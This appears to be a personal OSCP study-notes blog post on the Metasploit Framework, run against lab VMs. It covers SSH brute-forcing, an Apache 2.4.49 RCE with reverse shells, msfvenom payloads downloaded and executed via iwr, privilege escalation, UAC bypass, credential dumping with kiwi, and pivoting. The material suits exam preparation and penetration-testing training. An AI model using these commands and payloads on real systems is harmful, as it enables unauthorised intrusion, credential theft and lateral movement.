---
title: Metasploit Framework
date: 2024-04-07 11:06:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Metasploit Framework tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# The Metasploit Framework

## Getting Familiar

### Setup and Work with MSF

```
192.168.249.202
```

```console
// start databse, which can store info about targets and successful exploit attempts
$ sudo msfdb init

// you can enable at boot time
$ sudo systemctl enable postgresql

$ sudo msfconsole

> db_status

> help

> workspace

> workspace -a pen200

> db_nmap

// execute nmap in metasploit and save findings in database
> db_nmap -A 192.168.249.202

> hosts

> services

> services -p 8000

> show -h
Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites
[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions
```

### Auxiliary Modules

Auxiliary modules provide protocol enumeration, port scanning, fuzzing, sniffing, and more, and are useful for info gathering (gather/hierarchy) and enum (scanner/hierarchy).

```
192.168.249.202 VM#2
192.168.249.201 VM#1
```


```console
> show auxiliary

> search type:auxiliary smb
   56  auxiliary/scanner/smb/smb_version                                                normal  No     SMB Version Detection

> use 56

msf6 auxiliary(scanner/smb/smb_version) > info

msf6 auxiliary(scanner/smb/smb_version) > show options

msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.249.202

// OR you can set the RHOSTS automatically with the database

msf6 auxiliary(scanner/smb/smb_version) > unset RHOSTS
msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts

msf6 auxiliary(scanner/smb/smb_version) > run
[*] 192.168.249.202:445   - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1, Pattern_V1) (encryption capabilities:AES-256-GCM) (signatures:optional) (guid:{0ffd6eea-581e-4c36-8b96-27c82686d18a}) (authentication domain:BRUTE2)
[*] 192.168.249.202:      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


// see if metasploit automatically detected vulnuss
msf6 auxiliary(scanner/smb/smb_version) > vulns
2024-04-07 17:22:28 UTC  192.168.249.202  SMB Signing Is Not Required  URL-https://support.microsoft.com/en-us/help/161372/how-to-enable-smb-signing-in-windows-nt,URL-https://support.microsoft.com/en-us/help/887429/overview-of-server-message-block-signing

```

Try another module.

```console

msf6 auxiliary(scanner/smb/smb_version) > search type:auxiliary ssh
15  auxiliary/scanner/ssh/ssh_login                                        normal  No     SSH Login Check Scanner

msf6 auxiliary(scanner/smb/smb_version) > use 16

msf6 auxiliary(scanner/ssh/ssh_login) > show options

msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME george
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.249.201
msf6 auxiliary(scanner/ssh/ssh_login) > set RPORT 2222
msf6 auxiliary(scanner/ssh/ssh_login) > run
[*] 192.168.249.201:2222 - Starting bruteforce
[+] 192.168.249.201:2222 - Success: 'george:chocolate' 'uid=1001(george) gid=1001(george) groups=1001(george) Linux brute 5.15.0-37-generic #39-Ubuntu SMP Wed Jun 1 19:16:45 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (192.168.119.2:38329 -> 192.168.249.201:2222) at 2022-07-28 07:22:05 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

// unlike hydra, metasploit not only displays valid credentials, but also opens a session

msf6 auxiliary(scanner/ssh/ssh_login) >  creds
```

### Exploit Modules

```
192.168.249.16
```

```console
> workspace -a exploits

> search Apache 2.4.49
   0  exploit/multi/http/apache_normalize_path_rce  2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE
   1  auxiliary/scanner/http/apache_normalize_path  2021-05-10       normal     No     Apache 2.4.49/2.4.50 Traversal RCE scanner

> use 0

> info
Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

> show options

// there is an additional option section named Payload options. if we don't set this, the module will select a default payload

> set payload payload/linux/x64/shell_reverse_tcp

> show options

Payload options (linux/x64/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

> set LHOST 192.168.45.198

// change the port from 4444 to avoid getting blocked by firewalls, you can use common ones like 80 or 443
// no neet to start listener manually

> set SSL false
> set RPORT 80
> set RHOSTS 192.168.249.16
> run
```

We can send the session to the background by pressing C+z and confirming the prompt. Use "sessions -l" to list all active sessions. Interact with a session again by passing session id to "sessions -j". Kill sessions with "sessions -k" with the id. 

Instead of launching an exploit module and sending the resulting session to the background, we can use run -j to launch it in the context of a job. We'll still find the output of launching the exploit module, but we'll need to interact with the resulting session before we can access it.

## Using Metasploit Payloads

### Staged vs Non-Staged Payloads

Non-staged payloads are sent in their entirety along with the exploit. The payload contains the exploit and full shellcode for a selected task. These are "all-in-one" and more stable. They will be bigger in size.

Staged payloads are usually sent in two parts. First part is a small primary payload that has the victim connect back to the attacker, and THEN transfers a larger secondary payload containing the rest of the shellcode, and then executes it.

We would use a staged payload if there are space limitations or antivirus software that can detect shellcode in an exploit. Staged payloads are less likely to be detected.

The "/" char indicates if a payload is stages or not. shell_reverse_tcp is not staged, whereas shell/reverse_tcp is.

```
192.168.249.16
```

```console
> show payloads 
   18  payload/linux/x64/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager

> set payload 18

> run
[*] Sending stage (38 bytes) to 192.168.249.16

// only 38 bytes!!
```

### Meterpreter Payload

Metasploit contains the Meterpreter payload, which is a multi-function payload that can be dynamically extended at run-time. The payload resides entirely in memory on the target and its communication is encrypted by default.

```console
> show payloads
   13  payload/linux/x64/meterpreter_reverse_tcp                          normal  No     Linux Meterpreter, Reverse TCP Inline

> set payload 13

> show options
```

Note: All meterpreter payloads are staged, even though the output of "show payloads" contains both staged and non-staged. The difference between those two types is how the Meterpreter payload is transferred to the target machine. The non-staged version includes all components required to launch a Meterpreter session while the staged version uses a separate first stage to load these components. In situations where our bandwidth is limited or we want to use the same payload to compromise multiple systems in an assessment, a non-staged Meterpreter payload comes in quite handy.

```console
> run

[*] Meterpreter session 5 opened (192.168.45.198:4444 -> 192.168.249.16:35222) at 2024-04-07 14:37:49 -0400

meterpreter > help

meterpreter > sysinfo
Computer     : 172.29.0.2
OS           : Ubuntu 20.04 (Linux 5.4.0-132-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux

meterpreter > getuid
Server username: daemon

// start interactive shell
meterpreter > shell
Process 147 created.
Channel 1 created.
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)

// Ctrl Z
Background channel 1? [y/N]  y
meterpreter > 

meterpreter > shell
Process 149 created.
Channel 2 created.
whoami
daemon
^Z
Background channel 2? [y/N]  y
meterpreter >

meterpreter > channel -l

    Id  Class  Type
    --  -----  ----
    1   3      stdapi_process
    2   3      stdapi_process

meterpreter > channel -i 1
Interacting with channel 1...

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)

// commands with "l" as prefix operate on the local system; in our case our Kali VM

meterpreter > lpwd
/home/kali

meterpreter > lcd /home/kali/Downloads

meterpreter > lpwd
/home/kali/Downloads

meterpreter > download /etc/passwd
[*] Downloading: /etc/passwd -> /home/kali/Downloads/passwd
[*] Downloaded 1.74 KiB of 1.74 KiB (100.0%): /etc/passwd -> /home/kali/Downloads/passwd
[*] download   : /etc/passwd -> /home/kali/Downloads/passwd

meterpreter > lcat /home/kali/Downloads/passwd
root:x:0:0:root:/root:/bin/bash
...

// upload unix-privesc-check to your metepreter shell!!

meterpreter > upload /usr/bin/unix-privesc-check /tmp/
[*] Uploading  : /usr/bin/unix-privesc-check -> /tmp/unix-privesc-check
[*] Completed  : /usr/bin/unix-privesc-check -> /tmp/unix-privesc-check
meterpreter > ls /tmp
Listing: /tmp
=============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  36801  fil   2024-04-07 14:47:31 -0400  unix-privesc-check
100755/rwxr-xr-x  250    fil   2024-04-07 14:08:30 -0400  yLbHn

// If our target runs the Windows operating system, we need to escape the backslashes in the destination path with backslashes like "\\".

meterpreter > exit
```

Try another 64-bit Linux Meterpreter payload - one that is not a raw TCP conn, but a HTTPS conn that is encrypted with SSL/TLS.

```console
> show payloads
   12  payload/linux/x64/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline

> set payload 12

> show options
Payload options (linux/x64/meterpreter_reverse_https):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.45.198   yes       The local listener hostname
   LPORT  8443             yes       The local listener port
   LURI                    no        The HTTP Path

// LURI is used to leverage a single listener on one port capable of handling different requests based on the path in this option and provide a logical separation. if left blank, Metasploit uses / as path.

> run
```

We should always attempt to obtain an initial foothold with a raw TCP shell and then deploy a Meterpreter shell as soon as we have disabled or bypassed potential security technologies.

### Executable Payloads

Metasploit lets us export payloads into various file types, such as Windows and Linux binaries, web shells, and more. Msfvenom is a standalone tool that generates such payloads.

```
192.168.249.202
```

Create a malicious Windows binary starting a raw TCP reverse shell:

```console
$ msfvenom -l payloads --platform windows --arch x64

windows/x64/shell/reverse_tcp               Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker (Windows x64)
...
windows/x64/shell_reverse_tcp               Connect back to attacker and spawn a command shell (Windows x64)

// see staged vs non staged above

$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.198 LPORT=443 -f exe -o nonstaged.exe
```

Start a netcat listening on 443, python3 web server on port 80, and connect to BRUTE2 via RDP with user justin and password SuperS3cure1337#.

```console
PS justin> iwr -uri http://192.168.45.198/nonstaged.exe -Outfile nonstaged.exe

PS justin> .\nonstaged.exe
```

You should have a shell in your Kali nc listener now.

Let's try a staged payload to do ths same.

```console
$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.198 LPORT=443 -f exe -o staged.exe

PS justin> iwr -uri http://192.168.45.198/nonstaged.exe -Outfile staged.exe

PS justin> .\staged.exe
```

We can't execute any commands from this. We need to use Metasploit's multi/handler module to receive the incoming connection from staged.exe.

```console
msf6 exploit(multi/http/apache_normalize_path_rce) > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp

msf6 exploit(multi/handler) > show options
...
Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
...

msf6 exploit(multi/handler) > set LHOST 192.168.45.198
LHOST => 192.168.45.198
msf6 exploit(multi/handler) > set LPORT 443

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.119.2:443 
```

## Post-Exploitation with Metasploit

Note: the Linux Meterpreter payload contains fewer post-exploitation features than the Windows one.

Assume we already gained an initial foothold on the target system and deployed a bind shell as way of accessing the system.

```
192.168.249.223
```

```console
$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.198 LPORT=443 -f exe -o met.exe
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https
payload => windows/x64/meterpreter_reverse_https

msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443

msf6 exploit(multi/handler) > run
[*] Exploit running as background job 2.
[*] Exploit completed, but no session was created.

$ python3 -m http.server 80

// connect to bind shell we already have

$  nc 192.168.249.223 4444

> whoami /priv
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 

> powershell

> iwr -uri http://192.168.45.198/met.exe -Outfile met.exe

> .\met.exe


[*] Meterpreter session 1 opened (192.168.45.198:443 -> 192.168.249.223:62156) at 2024-04-07 16:40:34 -0400

meterpreter > 
```

Now for post-exploitation work. For several post-exploitation features, we need administrative privileges to execute them. Metasploit contains the command getsystem, which attempts to automatically elevate our permissions to NT AUTHORITY\SYSTEM. It uses various techniques using named pipe impersonation and token duplication. In the default settings, getsystem uses all available techniques (shown in the help menu) attempting to leverage SeImpersonatePrivilege1 and SeDebugPrivilege.

```console
> idletime
User has been idle for: 11 mins 41 secs

> getuid
Server username: ITWK01\luiza

> getsystem

> getuid
Server username: NT AUTHORITY\SYSTEM
```

To avoid suspicion or a defender closing our process, we can use migrate to move the execution of our Meterpreter payload to a different process. We should note that we are only able to migrate into processes that execute at the same (or lower) integrity and privilege level than that of our current process. In the context of this example, we already elevated our privileges to NT AUTHORITY\SYSTEM so our choices are plentiful.

```console
m> ps
 PID   PPID  Name                   Arch  Session  User  
 7964  8796  met.exe                x64   0        ITWK01\luiza                  C:\Users\luiza\met.exe
 7112  5276  OneDrive.exe           x64   1        ITWK01\offsec                 C:\Users\offsec\AppData\Local\Microsoft\OneDrive

m> migrate 7112
[*] Migrating from 7964 to 7112...
[*] Migration completed successfully.

m> ps

m> getuid
Server username: ITWK01\offsec
```

Instead of migrating to an existing process or a situation in which we won't find any suitable processes to migrate to, we can use the execute Meterpreter command. This command provides the ability to create a new process by specifying a command or program.

```console
m> execute -H -f notepad
Process 2716 created.

> migrate 2716
```

Meterpreter offers a variety of other interesting post-exploitation modules such as hashdump, which dumps the contents of the SAM database or screenshare, which displays the target machine's desktop in real-time.


### Post-Exploitation Modules

If the target user is a member of the local administrators group, we can elevate our shell to a high integrity level if we can bypass User Account Control (UAC). Repeat steps from the previous section, and then bypass UAC with a Metasploit post-exploitation module. 

```
192.168.249.223
```

```console
> getsystem

> ps
 7112  5276  OneDrive.exe           x64   1        ITWK01\offsec                 C:\Users\offsec\AppData\Local\Microsoft\OneDrive

> migrate 7112

> getuid
Server username: ITWK01\offsec
```

We can't perform admin actions as offsec due to UAC. To display the integrity level of a process, we can use tools such as Process Explorer2 or third-party PowerShell modules such as NtObjectManager. Let's assume the latter is already installed on the system. 

Import the module with Import-Module, and use Get-NtTokenIntegrityLevel to display the integrity level of the current process by retrieving and reviewing the assigned access token.

```console
> shell

> powershell -ep bypass

> Import-Module NtObjectManager

> Get-NtTokenIntegrityLevel

> ^Ctrl Z
Background channel 1? [y/N]  y

> bg
[*] Backgrounding session 2...

> msf6 exploit(multi/handler) > search UAC

> use exploit/windows/local/bypassuac_sdclt

> show options
> set SESSION 2
> set LHOST 192.168.45.198
> run
[*] Started HTTPS reverse handler on https://192.168.45.198:443
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[!] This exploit requires manual cleanup of 'C:\Users\offsec\AppData\Local\Temp\xHplJY.exe'
[*] Please wait for session and cleanup....
[*] Registry Changes Removed
[*] Exploit completed, but no session was created.

> shell

> powershell -ep bypass
> Import-Module NtObjectManager
> Get-NtTokenIntegrityLevel
High
```

We have successfuly bypassed UAC. We can also load extensions with the "load" command. Kiwi is a good one, which provides the capabilities of Mimkatz. 

Mimikatz requires SYSTEM rights, so exit the current Meterpreter session, start the listener again, execute met.exe and luiza and enter getsystem.

```console
> use exploit/multi/handler
> run
> getsystem

> load kiwi
> help
...
creds_msv              Retrieve LM/NTLM creds (parsed)
...

> creds_msv
luiza     ITWK01  167cf9218719a1209efcfb4bce486a18  2f92bb5c2a2526a630122ea1b642c46193a0d837
offsec    ITWK01  1c3fb240ae45a2dc5951a043cf47040e  a914116eb78bec73deb3819546426c2f6bd80bbd
```

### Pivoting with Metasploit

```
192.168.249.223  VM #1
172.16.134.200  VM #2
```

```console
C:\Users\luiza> ipconfig

// second interface has the assigned IP 172.16.134.199


[*] Meterpreter session 4 opened (192.168.119.4:443 -> 127.0.0.1) at 2022-08-05 05:13:42 -0400
meterpreter >

> route add 172.16.134.0/24 4

> route print
```

We can now scan the whole network for live hosts (RHOSTS to 172.16.134.0/24) with a port scan auxiliary mode. We'll only scan the one here (RHOSTS to 172.16.134.199).

```console
> use auxiliary/scanner/portscan/tcp

> set RHOSTS 172.16.134.200

> set PORTS 445,3389

> run
[+] 172.16.134.200:       - 172.16.134.200:445 - TCP OPEN
[+] 172.16.134.200:       - 172.16.134.200:3389 - TCP OPEN
```

Let's target SMB and RDP using the pivot host VM 01. Fe'll attempt to use the psexec1 module to get access on the second target as user luiza. We previously retrieved the NTLM hash via Kiwi. Let's assume we could successfully crack the NTLM hash and the clear-text password is BoccieDearAeroMeow1!. For psexec to succeed, luiza has to be a local administrator on the second machine. Let's assume we confirmed this through information gathering techniques.

```console
> use exploit/windows/smb/psexec
> set SMBUser luiza
> set SMBPass "BoccieDearAeroMeow1!"
> set RHOSTS 172.16.134.200
> set payload windows/x64/meterpreter/bind_tcp
> set LPORT 8000
> run
```

We have now successfully used the psexec module to obtain a meterpreter shell on the second target via the first pivot machine!

Alternatively to adding routes manually, we can use the autoroute post-exploitation module to set up pivot routes through an existing Meterpreter session automatically. To do this, first remove the route we set manually. Let's terminate the Meterpreter session created through the psexec module and remove all routes with route flush

```console
> use multi/manage/autoroute
> show options
> sessions -l
  4         meterpreter x64/windows  ITWK01\luiza @ ITWK01  192.168.45.198:443 -> 192.168.249.223:62142 (192.168.249.223)

> set session 4

> run
[+] Route added to subnet 172.16.134.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 192.168.249.0/255.255.255.0 from host's routing table.
```

We could use the psexec module like we did before, or we could combine routes with the server/socks_proxy auxiliary module to configure a SOCKS2 proxy. This allows applications outside of the Metasploit Framework to tunnel through the pivot on port 1080 by default. We set the option SRVHOST to 127.0.0.1 and VERSION to 5 in order to use SOCKS version 5

```console
> use auxiliary/server/socks_proxy
> show options
> set SRVHOST 127.0.0.1
> set VERSION 5
> run -j

// update proxychains conf
$ tail /etc/proxychains4.conf
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 1080

// run proxychains with xfreerdp

$ sudo proxychains xfreerdp /v:172.16.134.200 /u:luiza
```

You could also use portfwd from in a Meterpreter session.

```console
m> portfwd -h

// create port forward
m> portfwd add -l 3389 -p 3389 -r 172.16.134.200

// connect to 127.0.0.1:3389 with xfreerdp to access the compromised host in the internal network

kali$ sudo xfreerdp /v:127.0.0.1 /u:luiza
```

## Automating Metasploit

### Resource Scripts

```
192.168.249.202
```

If we want to set up serveral multi/handler listeners, we could either let Metasploit run in the background the whole time or start Metasploit and manually set up a listener each time, or we could also create a resource script to automate this task for us.

```console
// create file
$ nano listener.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.45.198
set LPORT 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j

$ sudo msfconsole -r listener.rc
[*] Started HTTPS reverse handler on https://192.168.45.198:443

$ xfreerdp /u:justin /p:SuperS3cure1337# /v:192.168.249.202
```

Now in Justin's powershell:

```console
> iwr -uri http://192.168.45.198/met.exe -Outfile met.exe
> .\met.exe

// in meterpreter console

[*] Session ID 1 (192.168.119.4:443 -> 127.0.0.1) processing AutoRunScript 'post/windows/manage/migrate'
[*] Running module against BRUTE2
[*] Current server process: met.exe (2004)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 5340
[+] Successfully migrated into process 5340
[*] Meterpreter session 1 opened (192.168.119.4:443 -> 127.0.0.1) at 2022-08-02 09:54:32 -0400
```

Pre-written scripts are available:

```console
kali$ ls -l /usr/share/metasploit-framework/scripts/resource
```
